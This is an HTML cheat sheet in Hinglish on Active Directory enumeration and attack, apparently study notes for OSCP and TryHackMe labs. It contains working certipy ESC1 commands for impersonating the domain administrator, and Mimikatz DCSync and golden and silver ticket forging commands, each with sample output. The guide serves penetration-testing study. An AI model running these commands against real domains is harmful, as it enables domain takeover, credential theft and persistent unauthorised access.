@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>AD Enumeration — Master Field Reference</title>
+<style>
+:root{
+  --bg:#0d1117; --bg-raised:#131a22; --bg-card:#1a2330;
+  --line:#22303c; --text:#d6e2ea; --text-dim:#8296a5;
+  --accent:#5ee6c8; --accent-dim:#1e4a42; --warn:#e6b65e; --red:#f08a7e; --green:#7ee68a; --blue:#7eb8e6;
+  box-sizing:border-box; padding-top:env(safe-area-inset-top,0px); padding-bottom:env(safe-area-inset-bottom,0px);
+}
+html{ scroll-padding-top:env(safe-area-inset-top,0px); }
+*{ box-sizing:inherit; margin:0; padding:0; }
+@media(prefers-color-scheme:light){
+  :root:not([data-theme="dark"]){
+    --bg:#f2f5f7; --bg-raised:#ffffff; --bg-card:#eef2f4; --line:#d7dee3;
+    --text:#1b2630; --text-dim:#566675; --accent:#0a8a72; --accent-dim:#c9efe8;
+    --warn:#9a6a0a; --red:#b23b2e; --green:#1f8a3a; --blue:#2466a8;
+  }
+}
+:root[data-theme="dark"]{
+  --bg:#0d1117; --bg-raised:#131a22; --bg-card:#1a2330; --line:#22303c;
+  --text:#d6e2ea; --text-dim:#8296a5; --accent:#5ee6c8; --accent-dim:#1e4a42;
+  --warn:#e6b65e; --red:#f08a7e; --green:#7ee68a; --blue:#7eb8e6;
+}
+body{ background:var(--bg); color:var(--text); font-family:"SF Mono",ui-monospace,"Cascadia Code",Consolas,monospace; line-height:1.6; }
+.wrap{ max-width:1000px; margin:0 auto; padding:48px 20px 100px; }
+header{ margin-bottom:34px; }
+.badge{ display:inline-block; background:var(--accent-dim); color:var(--accent); font-size:11px; padding:3px 10px; border-radius:3px; margin-bottom:12px; }
+h1{ font-size:clamp(24px,4.5vw,34px); font-weight:700; letter-spacing:-0.01em; margin-bottom:10px; }
+.sub{ color:var(--text-dim); font-size:14px; max-width:75ch; line-height:1.7; }
+
+nav.toc{ display:flex; flex-wrap:wrap; gap:8px; padding-bottom:26px; margin-bottom:40px; border-bottom:1px solid var(--line); }
+nav.toc a{ color:var(--text-dim); text-decoration:none; font-size:11.5px; border:1px solid var(--line); padding:5px 11px; border-radius:4px; }
+nav.toc a:hover{ color:var(--accent); border-color:var(--accent); }
+
+section{ margin-bottom:52px; scroll-margin-top:24px; }
+.sec-head{ display:flex; align-items:baseline; gap:10px; margin-bottom:6px; }
+.sec-num{ color:var(--accent); font-size:13px; }
+h2{ font-size:19px; font-weight:600; }
+.sec-desc{ color:var(--text-dim); font-size:13px; max-width:76ch; margin:6px 0 18px; }
+
+.overflow-x{ overflow-x:auto; width:100%; }
+table{ width:100%; border-collapse:collapse; font-size:12.5px; background:var(--bg-raised); border:1px solid var(--line); border-radius:6px; overflow:hidden; margin-bottom:10px; }
+th{ padding:9px 13px; text-align:left; color:var(--text-dim); font-size:10.5px; border-bottom:1px solid var(--line); white-space:nowrap; }
+td{ padding:9px 13px; border-bottom:1px solid var(--line); vertical-align:top; }
+tr:last-child td{ border-bottom:none; }
+.k{ color:var(--accent); white-space:nowrap; font-weight:600; }
+.v-crack{ color:var(--green); }
+.v-nocrack{ color:var(--red); }
+.v-maybe{ color:var(--warn); }
+.dim{ color:var(--text-dim); }
+
+.note{ border-left:2px solid var(--warn); background:var(--bg-raised); padding:10px 14px; font-size:12px; color:var(--text-dim); border-radius:0 6px 6px 0; margin:10px 0 18px; }
+.note b{ color:var(--warn); }
+.tip{ border-left:2px solid var(--accent); background:var(--bg-raised); padding:10px 14px; font-size:12px; color:var(--text-dim); border-radius:0 6px 6px 0; margin:10px 0 18px; }
+.tip b{ color:var(--accent); }
+
+.pill{ display:inline-block; padding:2px 8px; border-radius:3px; font-size:10.5px; font-weight:600; }
+.pill.crack{ background:rgba(126,230,138,0.12); color:var(--green); }
+.pill.nocrack{ background:rgba(240,138,126,0.12); color:var(--red); }
+.pill.maybe{ background:rgba(230,182,94,0.12); color:var(--warn); }
+
+.code-block{ background:var(--bg-raised); border:1px solid var(--line); border-radius:6px; overflow:hidden; margin-bottom:14px; }
+.code-label{ padding:7px 14px; border-bottom:1px solid var(--line); font-size:11px; color:var(--text-dim); }
+pre{ padding:12px 16px; overflow-x:auto; font-size:12.5px; line-height:1.6; }
+pre .c{ color:var(--accent); } pre .w{ color:var(--warn); } pre .d{ color:var(--text-dim); }
+
+footer{ margin-top:50px; padding-top:18px; border-top:1px solid var(--line); color:var(--text-dim); font-size:11.5px; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header>
+  <div class="badge">master reference — AD / Windows enumeration</div>
+  <h1>AD Enumeration — Field by Field</h1>
+  <p class="sub">PowerView/LDAP output ke har field ka matlab, kya focus karna hai, hash types kab crackable hain, aur nmap/SMB enumeration ke important outputs — sab ek jagah.</p>
+</header>
+
+<nav class="toc">
+  <a href="#user">01 User Attributes</a>
+  <a href="#uac">02 UserAccountControl Flags</a>
+  <a href="#computer">03 Computer Attributes</a>
+  <a href="#group">04 Group/ACL Attributes</a>
+  <a href="#hash">05 Hash Types &amp; Crackability</a>
+  <a href="#nmap">06 Nmap — AD Ports</a>
+  <a href="#smb">07 SMB/CIFS Enumeration</a>
+  <a href="#sid">08 SID Structure</a>
+  <a href="#adcs">09 AD CS (Certificate) Vulns</a>
+  <a href="#tickets">10 Golden / Silver Ticket</a>
+</nav>
+
+<!-- ══════════ USER ATTRIBUTES ══════════ -->
+<section id="user">
+  <div class="sec-head"><span class="sec-num">01</span><h2>User Object — Important Attributes</h2></div>
+  <p class="sec-desc">Get-DomainUser / Get-ADUser output mein yeh fields sabse zyada matter karte hain.</p>
+  <div class="overflow-x">
+  <table>
+    <tr><th>Field</th><th>Focus Kyun</th></tr>
+    <tr><td class="k">samaccountname</td><td>Login username — attack commands mein yahi use hota hai (<code>-Identity</code>, <code>-user</code>)</td></tr>
+    <tr><td class="k">objectsid</td><td>User ka unique SID — RID (last number) se confirm hota hai privilege level (500=Administrator, 512=Domain Admins group)</td></tr>
+    <tr><td class="k">memberof</td><td>Kaunse groups ka member hai — <b>sabse important field</b>, privilege escalation paths yahin se dikhte hain</td></tr>
+    <tr><td class="k">useraccountcontrol</td><td>Account flags — delegation type, password settings, disabled/enabled (<a href="#uac">section 02 dekho</a>)</td></tr>
+    <tr><td class="k">serviceprincipalname (SPN)</td><td>Agar set hai → <b>Kerberoastable</b> account hai, TGS maang ke offline crack try kar sakte ho</td></tr>
+    <tr><td class="k">pwdlastset</td><td>Password kab change hua — bahut purana ho to weak/default password hone ka chance zyada</td></tr>
+    <tr><td class="k">admincount</td><td><code>1</code> ho to kabhi privileged group ka member tha (ya hai) — AdminSDHolder protected object</td></tr>
+    <tr><td class="k">msds-allowedtodelegateto</td><td>Constrained Delegation target services — agar populated hai, delegation abuse possible</td></tr>
+    <tr><td class="k">lastlogon / lastlogontimestamp</td><td>Account active hai ya stale — stale accounts aksar misconfigured/forgotten hote hain</td></tr>
+    <tr><td class="k">description</td><td><b>Often overlooked</b> — admins kabhi kabhi yahan password ya hints likh dete hain galti se</td></tr>
+    <tr><td class="k">distinguishedname</td><td>OU path dikhata hai — kis team/department ka account hai pata chalta hai</td></tr>
+  </table>
+  </div>
+  <div class="tip"><b>Priority order jab enumerate karo:</b> memberof → serviceprincipalname → useraccountcontrol → admincount → description</div>
+</section>
+
+<!-- ══════════ UAC FLAGS ══════════ -->
+<section id="uac">
+  <div class="sec-head"><span class="sec-num">02</span><h2>userAccountControl — Flags Decode</h2></div>
+  <p class="sec-desc">Yeh field ek bitmask hai, lekin tools usko readable flags mein show karte hain. Yeh flags attack ka decide karte hain.</p>
+  <div class="overflow-x">
+  <table>
+    <tr><th>Flag</th><th>Matlab</th><th>Attack Angle</th></tr>
+    <tr><td class="k">DONT_REQ_PREAUTH</td><td>Kerberos pre-authentication off hai</td><td><span class="pill crack">AS-REP Roastable</span> — bina password ke hash mil jaata hai</td></tr>
+    <tr><td class="k">TRUSTED_FOR_DELEGATION</td><td>Unconstrained delegation</td><td>Agar non-DC machine par mile → TGT harvesting attack</td></tr>
+    <tr><td class="k">TRUSTED_TO_AUTH_FOR_DELEGATION</td><td>Constrained delegation (protocol transition)</td><td>S4U2Self + S4U2Proxy abuse</td></tr>
+    <tr><td class="k">PASSWD_NOTREQD</td><td>Empty password allowed ho sakta hai</td><td>Blank password try karo</td></tr>
+    <tr><td class="k">DONT_EXPIRE_PASSWORD</td><td>Password kabhi expire nahi hota</td><td>Agar weak hai, lambe time tak valid rahega</td></tr>
+    <tr><td class="k">ACCOUNTDISABLE</td><td>Account disabled hai</td><td>Currently exploit nahi kar sakte, skip karo</td></tr>
+    <tr><td class="k">NOT_DELEGATED</td><td>Yeh account kisi ke liye delegate nahi ho sakta</td><td>Sensitive account hai — protected</td></tr>
+    <tr><td class="k">SERVER_TRUST_ACCOUNT</td><td>Yeh ek Domain Controller ka computer account hai</td><td>Normal, DC identify karne ke liye</td></tr>
+    <tr><td class="k">WORKSTATION_TRUST_ACCOUNT</td><td>Normal computer/workstation account</td><td>Standard machine account</td></tr>
+  </table>
+  </div>
+</section>
+
+<!-- ══════════ COMPUTER ══════════ -->
+<section id="computer">
+  <div class="sec-head"><span class="sec-num">03</span><h2>Computer Object — Important Attributes</h2></div>
+  <div class="overflow-x">
+  <table>
+    <tr><th>Field</th><th>Focus Kyun</th></tr>
+    <tr><td class="k">operatingsystem</td><td>OS version — purana/unpatched OS = known exploits ka chance</td></tr>
+    <tr><td class="k">dnshostname</td><td>FQDN — connection/pivot ke liye zaroori</td></tr>
+    <tr><td class="k">primarygroupid</td><td><code>516</code> = Domain Controller, <code>515</code> = normal workstation/server</td></tr>
+    <tr><td class="k">serviceprincipalname</td><td>Kaunsi services host kar raha hai (LDAP, TERMSRV/RDP, HTTP, MSSQL etc.)</td></tr>
+    <tr><td class="k">msds-allowedtodelegateto</td><td>Yeh machine kis service ke liye delegate kar sakti hai (RBCD check ke liye bhi)</td></tr>
+    <tr><td class="k">useraccountcontrol</td><td>Same flags jo user mein hain — unconstrained delegation yahan bhi check karo</td></tr>
+  </table>
+  </div>
+</section>
+
+<!-- ══════════ GROUP / ACL ══════════ -->
+<section id="group">
+  <div class="sec-head"><span class="sec-num">04</span><h2>Group / ACL Enumeration</h2></div>
+  <div class="overflow-x">
+  <table>
+    <tr><th>Field / Command</th><th>Focus Kyun</th></tr>
+    <tr><td class="k">Get-DomainGroupMember</td><td>Group ke members — nested groups bhi check karo (indirect membership)</td></tr>
+    <tr><td class="k">ActiveDirectoryRights</td><td>ACE mein permission type — <code>GenericAll</code>, <code>GenericWrite</code>, <code>WriteDACL</code>, <code>ForceChangePassword</code> dhoondo</td></tr>
+    <tr><td class="k">SecurityIdentifier (ACE)</td><td>Kisko permission mila hai target object par — apna account ya apni group match karo</td></tr>
+    <tr><td class="k">AdminCount=1 wale users</td><td>Protected group members — high value targets</td></tr>
+  </table>
+  </div>
+  <div class="code-block">
+    <div class="code-label">Interesting ACEs dhoondne ke liye</div>
+    <pre>Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match <span class="c">'GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword|AllExtendedRights'</span>}</pre>
+  </div>
+</section>
+
+<!-- ══════════ HASH TYPES ══════════ -->
+<section id="hash">
+  <div class="sec-head"><span class="sec-num">05</span><h2>Hash Types — Kab Crackable, Kab Nahi</h2></div>
+  <p class="sec-desc">Alag-alag jagah se alag hash types milte hain — har ek ki apni cracking feasibility hoti hai.</p>
+  <div class="overflow-x">
+  <table>
+    <tr><th>Hash Type</th><th>Kahan Se Milta Hai</th><th>Crackable?</th><th>Notes</th></tr>
+    <tr>
+      <td class="k">NTLM</td>
+      <td>SAM dump, LSASS, NTDS.dit</td>
+      <td><span class="pill maybe">Conditional</span></td>
+      <td>Fast hash hai — GPU se bahut jaldi crack ho sakta hai agar password weak hai. Strong password ho to practically uncrackable time mein.</td>
+    </tr>
+    <tr>
+      <td class="k">Net-NTLMv1</td>
+      <td>SMB/HTTP auth capture (Responder etc.)</td>
+      <td><span class="pill crack">Haan</span></td>
+      <td>Weak design — relatively fast crack ho jaata hai, ya relay bhi kar sakte ho</td>
+    </tr>
+    <tr>
+      <td class="k">Net-NTLMv2</td>
+      <td>SMB/HTTP auth capture (Responder, mitm6)</td>
+      <td><span class="pill maybe">Slow but possible</span></td>
+      <td>Salted — crack slow hai, wordlist/weak password par hi feasible. Relay zyada effective option hai cracking se</td>
+    </tr>
+    <tr>
+      <td class="k">Kerberos RC4 (etype 23)</td>
+      <td>Kerberoasting (TGS request)</td>
+      <td><span class="pill crack">Haan</span></td>
+      <td>Offline crack ke liye best target — service account ka weak password ho to fast crack</td>
+    </tr>
+    <tr>
+      <td class="k">Kerberos AES256 (etype 18)</td>
+      <td>Kerberoasting (agar AES enforce hai)</td>
+      <td><span class="pill nocrack">Mushkil</span></td>
+      <td>Bahut slow to crack — GPU par bhi RC4 se kai guna zyada time</td>
+    </tr>
+    <tr>
+      <td class="k">AS-REP hash</td>
+      <td>AS-REP Roasting (DONT_REQ_PREAUTH flag)</td>
+      <td><span class="pill crack">Haan</span></td>
+      <td>Same feasibility jaisa Kerberoasting — bina kisi authentication ke milta hai</td>
+    </tr>
+    <tr>
+      <td class="k">NTDS.dit hash</td>
+      <td>DCSync / NTDS.dit dump</td>
+      <td class="dim">Depends</td>
+      <td>Pass-the-hash ke liye directly usable hai, cracking ki zaroorat hi nahi aksar</td>
+    </tr>
+    <tr>
+      <td class="k">DPAPI masterkey</td>
+      <td>DPAPI_SYSTEM secret (Mimikatz)</td>
+      <td><span class="pill nocrack">N/A</span></td>
+      <td>Decrypt karne ke liye use hota hai, "crack" nahi karte — saved credentials/cookies unlock karta hai</td>
+    </tr>
+  </table>
+  </div>
+  <div class="note"><b>Golden Rule:</b> NTLM aur Kerberos RC4 hashes — pehle <b>Pass-the-Hash/Overpass-the-Hash</b> try karo (direct use), tabhi <b>cracking</b> par jao jab direct use possible na ho ya plaintext chahiye ho.</div>
+</section>
+
+<!-- ══════════ NMAP ══════════ -->
+<section id="nmap">
+  <div class="sec-head"><span class="sec-num">06</span><h2>Nmap — AD/Windows Environment Mein Important Ports</h2></div>
+  <div class="overflow-x">
+  <table>
+    <tr><th>Port</th><th>Service</th><th>Kyun Important Hai</th></tr>
+    <tr><td class="k">53</td><td>DNS</td><td>Domain Controller hone ka strong indicator — zone transfer try karo</td></tr>
+    <tr><td class="k">88</td><td>Kerberos</td><td>Kerberoasting/AS-REP roasting ke liye zaroori — DC yahi par hai</td></tr>
+    <tr><td class="k">135</td><td>MSRPC</td><td>RPC enumeration (rpcclient), coercion attacks (PetitPotam) ke liye entry point</td></tr>
+    <tr><td class="k">139 / 445</td><td>NetBIOS / SMB</td><td><b>Sabse important</b> — share enumeration, null session, relay attacks (Section 07 dekho)</td></tr>
+    <tr><td class="k">389 / 636</td><td>LDAP / LDAPS</td><td>AD query karne ka core protocol — anonymous bind try karo pehle</td></tr>
+    <tr><td class="k">3268 / 3269</td><td>Global Catalog</td><td>Poore forest ka search — multi-domain environments mein zaroori</td></tr>
+    <tr><td class="k">5985 / 5986</td><td>WinRM (HTTP/HTTPS)</td><td>PSSession ke liye — agar open hai to remote shell milne ka chance</td></tr>
+    <tr><td class="k">3389</td><td>RDP</td><td>Interactive access — firewall se filtered hona common hai (pivoting zaroorat)</td></tr>
+    <tr><td class="k">1433</td><td>MSSQL</td><td>Service accounts aksar weak privileges ke saath, xp_cmdshell se code-exec possible</td></tr>
+    <tr><td class="k">9389</td><td>AD Web Services</td><td>PowerShell AD module (RSAT) isi par depend karta hai</td></tr>
+  </table>
+  </div>
+  <div class="code-block">
+    <div class="code-label">Full AD scan ek command mein</div>
+    <pre>nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,5986,9389 -sV -oA ad_scan <span class="c">&lt;target&gt;</span></pre>
+  </div>
+</section>
+
+<!-- ══════════ SMB/CIFS ══════════ -->
+<section id="smb">
+  <div class="sec-head"><span class="sec-num">07</span><h2>SMB / CIFS Enumeration</h2></div>
+  <div class="overflow-x">
+  <table>
+    <tr><th>Check</th><th>Command</th><th>Kya Dekhna Hai</th></tr>
+    <tr><td class="k">Null session</td><td class="dim">smbclient -N -L //target</td><td>Anonymous access allowed hai kya — shares list ho jaayengi</td></tr>
+    <tr><td class="k">Shares list</td><td class="dim">smbmap -H target -u user -p pass</td><td>READ/WRITE permissions har share par — sensitive data ya script-drop opportunities</td></tr>
+    <tr><td class="k">SMB signing</td><td class="dim">nmap --script smb2-security-mode -p445 target</td><td>Agar signing <b>disabled/not required</b> hai → <b>SMB Relay attack possible</b></td></tr>
+    <tr><td class="k">SYSVOL/NETLOGON</td><td class="dim">GPP passwords dhoondo (cpassword in XML)</td><td>Old Group Policy Preferences mein kabhi hardcoded passwords milte hain</td></tr>
+    <tr><td class="k">OS/version detect</td><td class="dim">nmap -O / smb2-security-mode script</td><td>Unpatched SMB = EternalBlue jaisi known RCE</td></tr>
+  </table>
+  </div>
+  <div class="tip"><b>Priority check:</b> SMB signing disabled + Responder/mitm6 chal raha ho = NTLM relay se seedha machine admin ban sakte ho, bina kisi password crack kiye.</div>
+</section>
+
+<!-- ══════════ SID STRUCTURE ══════════ -->
+<section id="sid">
+  <div class="sec-head"><span class="sec-num">08</span><h2>SID Structure — Kaise Decode Karein</h2></div>
+  <p class="sec-desc">Ek SID sirf ek random string nahi hai — iska structure fixed hai, aur <b>last number (RID)</b> se pata chal jaata hai yeh account kaun hai.</p>
+
+  <div class="code-block">
+    <div class="code-label">Example SID</div>
+    <pre>S-1-5-21-3885271727-2693558621-2658995185-<span class="w">500</span>
+<span class="d">│ │ │  └──────────── Domain Identifier (unique per domain) ────────────┘    └ RID</span>
+<span class="d">│ │ └─ Identifier Authority (5 = NT Authority)</span>
+<span class="d">│ └─── Revision level (hamesha 1)</span>
+<span class="d">└───── "S" = SID literal</span></pre>
+  </div>
+
+  <p class="sec-desc">Domain part (<code>S-1-5-21-xxxx-xxxx-xxxx</code>) <b>har domain mein same rehta hai</b> — sirf last number (RID) badalta hai account ke hisaab se. Isliye RID yaad rakhna sabse zaroori hai.</p>
+
+  <div class="overflow-x">
+  <table>
+    <tr><th>RID</th><th>Kaun Hai</th><th>Notes</th></tr>
+    <tr><td class="k">500</td><td>Built-in Administrator</td><td>Rename ho sakta hai, lekin RID 500 hamesha wahi account hai — high value target</td></tr>
+    <tr><td class="k">501</td><td>Guest</td><td>Default disabled hota hai</td></tr>
+    <tr><td class="k">512</td><td>Domain Admins (group)</td><td>Sabse powerful group — iska member milna = game over</td></tr>
+    <tr><td class="k">513</td><td>Domain Users (group)</td><td>Default group — har normal user isme hota hai</td></tr>
+    <tr><td class="k">514</td><td>Domain Guests</td><td>Rarely used</td></tr>
+    <tr><td class="k">515</td><td>Domain Computers</td><td>Normal workstation/server machine accounts</td></tr>
+    <tr><td class="k">516</td><td>Domain Controllers</td><td>DC machine accounts ka group — <code>primarygroupid</code> isi se match karte hain</td></tr>
+    <tr><td class="k">518</td><td>Schema Admins</td><td>AD schema modify kar sakte hain — bahut sensitive</td></tr>
+    <tr><td class="k">519</td><td>Enterprise Admins</td><td>Forest-wide highest privilege — DA se bhi upar multi-domain forest mein</td></tr>
+    <tr><td class="k">1000+</td><td>Custom users/groups</td><td>Har naya banaya hua object — sequentially number milta hai</td></tr>
+  </table>
+  </div>
+
+  <div class="code-block">
+    <div class="code-label">PowerShell — SID se username resolve karo (ya ulta)</div>
+    <pre>ConvertFrom-SID <span class="c">S-1-5-21-3885271727-2693558621-2658995185-500</span>
+<span class="d"># Output example:</span>
+<span class="w">za\Administrator</span>
+
+Get-DomainUser <span class="c">-Identity administrator</span> | Select samaccountname,objectsid
+<span class="d"># Output example:</span>
+<span class="w">samaccountname : Administrator
+objectsid      : S-1-5-21-3885271727-2693558621-2658995185-500</span></pre>
+  </div>
+
+  <div class="tip"><b>Quick trick:</b> Kisi bhi output mein SID ke bilkul last number ko dekho — agar <code>-500</code> ya <code>-512</code>/<code>-519</code> dikhe, to samajh jao yeh ek <b>high-value target</b> hai, chahe display name kuch bhi ho (rename kiya ja sakta hai, RID nahi badalta).</div>
+</section>
+
+<!-- ══════════ AD CS ══════════ -->
+<section id="adcs">
+  <div class="sec-head"><span class="sec-num">09</span><h2>AD CS — Certificate Services Vulnerabilities (ESC1–ESC8)</h2></div>
+  <p class="sec-desc">Agar domain mein <b>Active Directory Certificate Services (AD CS)</b> install hai, to misconfigured certificate templates se seedha Domain Admin tak pahunch sakte ho — OSCP/real engagements mein bahut common hai.</p>
+
+  <div class="code-block">
+    <div class="code-label">Enumeration — Certify ya Certipy se</div>
+    <pre>Certify.exe find /vulnerable
+<span class="d"># ya Linux se</span>
+certipy find -u user@domain.local -p Password123 -dc-ip <span class="c">10.10.10.1</span> -vulnerable</pre>
+  </div>
+
+  <div class="overflow-x">
+  <table>
+    <tr><th>Vuln</th><th>Misconfiguration</th><th>Impact</th></tr>
+    <tr><td class="k">ESC1</td><td>Template enrollee khud <code>SubjectAltName</code> specify kar sakta hai + client auth enabled</td><td>Kisi bhi user (Domain Admin bhi) ka naam daal ke uska certificate bana lo → unki identity se authenticate</td></tr>
+    <tr><td class="k">ESC2</td><td>Template "Any Purpose" EKU rakhta hai</td><td>Certificate kisi bhi purpose ke liye use ho sakta hai — auth sahit</td></tr>
+    <tr><td class="k">ESC3</td><td>"Certificate Request Agent" EKU misconfigured</td><td>Kisi aur user ki taraf se certificate request kar sakte ho (enrollment agent abuse)</td></tr>
+    <tr><td class="k">ESC4</td><td>Low-priv user ko template par <code>WriteProperty/GenericWrite</code> mila hua</td><td>Template ko khud modify karke usme ESC1-jaisi vulnerability inject kar do</td></tr>
+    <tr><td class="k">ESC6</td><td>CA flag <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> set hai</td><td>Poore CA-level par SAN specify kar sakte ho kisi bhi template se</td></tr>
+    <tr><td class="k">ESC8</td><td>CA Web Enrollment (HTTP) enabled, NTLM relay possible</td><td>Coercion (PetitPotam) + relay se DC ka certificate le lo</td></tr>
+  </table>
+  </div>
+
+  <div class="code-block">
+    <div class="code-label">ESC1 Exploit — Domain Admin ke naam se certificate request karo</div>
+    <pre>certipy req -u <span class="c">attacker@domain.local</span> -p <span class="c">Password123</span> -ca <span class="c">CORP-CA</span> -template <span class="c">VulnTemplate</span> -upn <span class="w">administrator@domain.local</span>
+<span class="d"># Output example:</span>
+<span class="w">[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Certificate object SID is 'S-1-5-21-...-500'
+[*] Saved certificate and private key to 'administrator.pfx'</span>
+
+<span class="d"># Phir us certificate se TGT lo (PKINIT)</span>
+certipy auth -pfx <span class="c">administrator.pfx</span> -dc-ip <span class="c">10.10.10.1</span>
+<span class="d"># Output:</span>
+<span class="w">[*] Using principal: administrator@domain.local
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] NT hash: aad3b435b51404eeaad3b435b51404ee</span></pre>
+  </div>
+
+  <div class="note"><b>OSCP ke liye:</b> Pehle <code>certipy find -vulnerable</code> chalao — agar ESC1 dikhe, yeh usually sabse fast Domain Admin path hota hai, Kerberoasting se bhi pehle try karne layak.</div>
+</section>
+
+<!-- ══════════ GOLDEN/SILVER TICKET ══════════ -->
+<section id="tickets">
+  <div class="sec-head"><span class="sec-num">10</span><h2>Golden Ticket vs Silver Ticket</h2></div>
+  <p class="sec-desc">Dono forged Kerberos tickets hain, lekin alag-alag hash chahiye aur alag scope milta hai.</p>
+
+  <div class="overflow-x">
+  <table>
+    <tr><th></th><th>Golden Ticket</th><th>Silver Ticket</th></tr>
+    <tr><td class="k">Chahiye</td><td><code>krbtgt</code> account ka NTLM hash</td><td>Target <b>service/computer account</b> ka NTLM hash</td></tr>
+    <tr><td class="k">Forge Kiya Jaata Hai</td><td>Ek fake <b>TGT</b> (Ticket Granting Ticket)</td><td>Ek fake <b>TGS</b> (Service Ticket) — seedha, TGT ki zaroorat nahi</td></tr>
+    <tr><td class="k">Scope</td><td><b>Poore domain</b> ki koi bhi service — sab kuch access</td><td>Sirf <b>ek specific service</b> jiska hash use kiya (jaise CIFS/HOST)</td></tr>
+    <tr><td class="k">DC Contact</td><td>Pehli baar banane mein nahi, lekin baad mein PAC validation ke time ho sakta hai</td><td><b>Bilkul nahi</b> — KDC se koi interaction nahi, isliye zyada stealthy</td></tr>
+    <tr><td class="k">Kab Use Karo</td><td>Jab krbtgt hash mil gaya ho (DCSync/NTDS.dit se) — poore domain ka permanent backdoor chahiye</td><td>Jab sirf ek service account/computer hash mila ho, aur sirf uss specific service tak access chahiye</td></tr>
+  </table>
+  </div>
+
+  <div class="code-block">
+    <div class="code-label">Golden Ticket — Mimikatz</div>
+    <pre><span class="d"># Pehle krbtgt hash chahiye (DCSync se milta hai)</span>
+mimikatz# lsadump::dcsync /user:za\krbtgt
+<span class="d"># Output example:</span>
+<span class="w">Hash NTLM: 1a2b3c4d5e6f7890abcdef1234567890
+SID: S-1-5-21-3885271727-2693558621-2658995185</span>
+
+<span class="d"># Ab golden ticket forge karo</span>
+mimikatz# kerberos::golden /user:fakeadmin /domain:za.tryhackme.loc /sid:<span class="c">S-1-5-21-...</span> /krbtgt:<span class="c">1a2b3c4d5e6f7890abcdef1234567890</span> /ptt
+<span class="d"># Output example:</span>
+<span class="w">User      : fakeadmin
+Domain    : za.tryhackme.loc (ZA)
+SID       : S-1-5-21-...
+User Id   : 500
+Groups Id : *513 512 520 518 519
+Golden ticket for 'fakeadmin @ za.tryhackme.loc' successfully submitted for current session</span>
+
+<span class="d"># Verify</span>
+dir \\THMDC\C$
+<span class="w">✅ Access granted — poore domain mein kahin bhi</span></pre>
+  </div>
+
+  <div class="code-block">
+    <div class="code-label">Silver Ticket — Mimikatz (CIFS service ke liye)</div>
+    <pre><span class="d"># Target machine ka hash chahiye (jaise machine account ka NTLM)</span>
+mimikatz# kerberos::golden /user:fakeadmin /domain:za.tryhackme.loc /sid:<span class="c">S-1-5-21-...</span> /target:<span class="c">THMSERVER1.za.tryhackme.loc</span> /service:<span class="w">CIFS</span> /rc4:<span class="c">4207d1b7e4b942da2371174b772fdf5e</span> /ptt
+<span class="d"># Output example:</span>
+<span class="w">User      : fakeadmin
+Service   : CIFS
+Target    : THMSERVER1.za.tryhackme.loc
+Silver ticket for 'fakeadmin @ za.tryhackme.loc' successfully submitted</span>
+
+<span class="d"># Verify — sirf CIFS (file share) access milega, poora domain nahi</span>
+dir \\THMSERVER1\C$
+<span class="w">✅ Access granted — SIRF THMSERVER1 ke CIFS tak</span>
+dir \\THMDC\C$
+<span class="red" style="color:var(--red)">❌ Access denied — doosri services/machines tak nahi</span></pre>
+  </div>
+
+  <div class="note"><b>OSCP ke liye priority:</b> Golden Ticket zyada common exam scenario hai (DCSync ke baad domain persistence dikhane ke liye). Silver Ticket kam use hota hai exams mein, lekin concept samajhna zaroori hai — "kam hash se bhi targeted access mil sakta hai" wali baat.</div>
+</section>
+
+<footer>
+  Yeh reference AD/Windows enumeration ke sabse common data points cover karta hai — asli engagement mein tool version aur environment ke hisaab se output format thoda vary kar sakta hai, lekin fields ka matlab same rehta hai.
+</footer>
+
+</div>
+</body>
+</html>
